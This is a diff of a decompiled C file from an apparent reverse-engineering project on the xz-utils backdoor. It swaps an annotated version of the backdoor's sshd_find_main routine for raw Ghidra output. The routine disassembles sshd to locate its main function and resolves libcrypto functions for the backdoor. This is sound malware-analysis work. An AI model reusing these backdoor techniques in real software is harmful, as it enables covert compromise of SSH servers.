@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/102550_sshd_find_main.c
 // Function: sshd_find_main @ 0x102550
-// Calling convention: __stdcall
-// Prototype: BOOL __stdcall sshd_find_main(u8 * * code_start_out, elf_info_t * sshd, elf_info_t * libcrypto, imported_funcs_t * imported_funcs)
+// Calling convention: unknown
+// Prototype: undefined sshd_find_main(void)
 
 
 /*
@@ -14,105 +14,93 @@
 #include "xzre_types.h"
 
 
-BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
-                   imported_funcs_t *imported_funcs)
+undefined8 sshd_find_main(ulong *param_1,long *param_2,long *param_3,long param_4)
 
 {
-  Elf64_Addr EVar1;
-  Elf64_Ehdr *pEVar2;
-  BOOL BVar3;
-  lzma_allocator *allocator_00;
-  u8 *puVar4;
-  _func_40 *p_Var5;
-  u8 *puVar6;
-  Elf64_Sym *pEVar7;
-  u8 *puVar8;
-  long lVar9;
-  u8 **ppuVar10;
-  uchar *code_start;
-  u8 *code_end;
-  u8 *puVar11;
-  u8 *puVar12;
+  long lVar1;
+  int iVar2;
+  long lVar3;
+  ulong uVar4;
+  long lVar5;
+  ulong uVar6;
+  long lVar7;
+  long *plVar8;
+  ulong uVar9;
+  ulong uVar10;
+  ulong uVar11;
+  ulong uVar12;
   byte bVar13;
-  lzma_allocator *allocator;
-  u8 *code_segment_start;
-  u8 *code_segment_end;
-  u8 *libc_start_main_got;
-  u8 *sshd_main_candidate;
-  u64 local_88;
-  u8 *local_80;
-  u64 local_78;
-  undefined1 local_6f;
-  undefined1 local_65;
-  undefined4 local_64;
+  long local_88;
+  long local_80;
+  long local_78;
+  byte local_6f;
+  byte local_65;
+  uint local_64;
   int local_58;
   long local_50;
   
   bVar13 = 0;
   local_88 = 0;
-  allocator_00 = get_lzma_allocator();
-  allocator_00->opaque = libcrypto;
-  puVar4 = (u8 *)elf_get_code_segment(sshd,&local_88);
-  if (puVar4 != (u8 *)0x0) {
-    puVar12 = puVar4 + local_88;
-    p_Var5 = (_func_40 *)lzma_alloc(0x758,allocator_00);
-    imported_funcs->EVP_PKEY_new_raw_public_key = p_Var5;
-    if (p_Var5 != (_func_40 *)0x0) {
-      imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
+  lVar3 = get_lzma_allocator(1);
+  *(long **)(lVar3 + 0x10) = param_3;
+  uVar4 = elf_get_code_segment(param_2,&local_88);
+  if (uVar4 != 0) {
+    uVar12 = local_88 + uVar4;
+    lVar5 = lzma_alloc(0x758,lVar3);
+    *(long *)(param_4 + 0x70) = lVar5;
+    if (lVar5 != 0) {
+      *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
     }
-    puVar6 = (u8 *)elf_get_got_symbol(sshd,STR_libc_start_main);
-    if (((puVar6 != (u8 *)0x0) &&
-        (code_start = sshd->elfbase->e_ident + sshd->elfbase->e_entry, code_start < puVar12)) &&
-       (puVar4 <= code_start)) {
-      ppuVar10 = &local_80;
-      lVar9 = 0x16;
-      code_end = code_start + 0x200;
-      if (puVar12 <= code_start + 0x200) {
-        code_end = puVar12;
+    lVar5 = elf_get_got_symbol(param_2,0x228);
+    if (((lVar5 != 0) && (uVar9 = *param_2 + *(long *)(*param_2 + 0x18), uVar9 < uVar12)) &&
+       (uVar4 <= uVar9)) {
+      plVar8 = &local_80;
+      lVar7 = 0x16;
+      uVar10 = uVar9 + 0x200;
+      if (uVar12 <= uVar9 + 0x200) {
+        uVar10 = uVar12;
       }
-      for (; lVar9 != 0; lVar9 = lVar9 + -1) {
-        *(undefined4 *)ppuVar10 = 0;
-        ppuVar10 = (u8 **)((long)ppuVar10 + (ulong)bVar13 * -8 + 4);
+      for (; lVar7 != 0; lVar7 = lVar7 + -1) {
+        *(undefined4 *)plVar8 = 0;
+        plVar8 = (long *)((long)plVar8 + (ulong)bVar13 * -8 + 4);
       }
-      pEVar7 = elf_symbol_get(libcrypto,STR_EVP_Digest,0);
-      if (pEVar7 != (Elf64_Sym *)0x0) {
-        EVar1 = pEVar7->st_value;
-        pEVar2 = libcrypto->elfbase;
-        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
-        imported_funcs->EVP_Digest = (_func_56 *)(pEVar2->e_ident + EVar1);
+      lVar7 = elf_symbol_get(param_3,0xf8,0);
+      if (lVar7 != 0) {
+        lVar7 = *(long *)(lVar7 + 8);
+        lVar1 = *param_3;
+        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
+        *(long *)(param_4 + 0xf0) = lVar7 + lVar1;
       }
-      puVar11 = (u8 *)0x0;
-      while (code_start < code_end) {
-        BVar3 = x86_dasm((dasm_ctx_t *)&local_80,code_start,code_end);
-        if (BVar3 == FALSE) {
-          code_start = code_start + 1;
+      uVar11 = 0;
+      while (uVar9 < uVar10) {
+        iVar2 = x86_dasm(&local_80,uVar9,uVar10);
+        if (iVar2 == 0) {
+          uVar9 = uVar9 + 1;
         }
         else {
           if (local_58 == 0x10d) {
-            if (((((local_65 & 0x48) == 0x48) && ((uint)local_64 >> 8 == 0x50700)) &&
-                (puVar8 = local_80 + local_50 + local_78, puVar4 <= puVar8)) && (puVar8 < puVar12))
-            {
-              puVar11 = puVar8;
+            if (((((local_65 & 0x48) == 0x48) && (local_64 >> 8 == 0x50700)) &&
+                (uVar6 = local_80 + local_78 + local_50, uVar4 <= uVar6)) && (uVar6 < uVar12)) {
+              uVar11 = uVar6;
             }
           }
-          else if (((puVar11 != (u8 *)0x0) && (local_58 == 0x17f)) &&
-                  (((uint)local_64 >> 8 == 0x50200 &&
-                   (((local_6f & 1) != 0 && (puVar6 == local_80 + local_78 + local_50)))))) {
-            pEVar7 = elf_symbol_get(libcrypto,STR_EVP_sha256,0);
-            if (pEVar7 != (Elf64_Sym *)0x0) {
-              imported_funcs->EVP_sha256 =
-                   (_func_38 *)(libcrypto->elfbase->e_ident + pEVar7->st_value);
-              imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
+          else if (((uVar11 != 0) && (local_58 == 0x17f)) &&
+                  ((local_64 >> 8 == 0x50200 &&
+                   (((local_6f & 1) != 0 && (lVar5 == local_50 + local_80 + local_78)))))) {
+            lVar3 = elf_symbol_get(param_3,0xc60,0);
+            if (lVar3 != 0) {
+              *(long *)(param_4 + 0x58) = *(long *)(lVar3 + 8) + *param_3;
+              *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
             }
-            *code_start_out = puVar11;
-            return TRUE;
+            *param_1 = uVar11;
+            return 1;
           }
-          code_start = code_start + local_78;
+          uVar9 = uVar9 + local_78;
         }
       }
     }
-    lzma_free(imported_funcs->EVP_PKEY_new_raw_public_key,allocator_00);
+    lzma_free(*(undefined8 *)(param_4 + 0x70),lVar3);
   }
-  return FALSE;
+  return 0;
 }
 
